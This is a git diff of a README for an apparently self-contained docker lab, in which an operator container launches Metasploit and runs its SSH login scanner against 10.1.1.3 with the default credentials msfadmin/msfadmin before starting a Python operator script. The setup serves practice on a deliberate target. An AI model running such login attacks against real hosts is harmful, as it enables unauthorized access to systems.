@@ -17,19 +17,19 @@ docker compose up -d --build
 
 Then launch into the operator machine
 ```console
-# In two separate terminals
 docker exec -it operator /bin/bash
 ```
 
-In the FIRST terminal:
+In the terminal
 ```bash
-# launch metasploit
 msfconsole -r /usr/src/metasploit-framework/docker/msfconsole.rc
-```
 
-In the SECOND terminal:
-```bash
-# run operator script
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 10.1.1.3
+set USERNAME msfadmin
+set PASSWORD msfadmin
+run
+
 cd eshuCLP
 python main.py
 ```
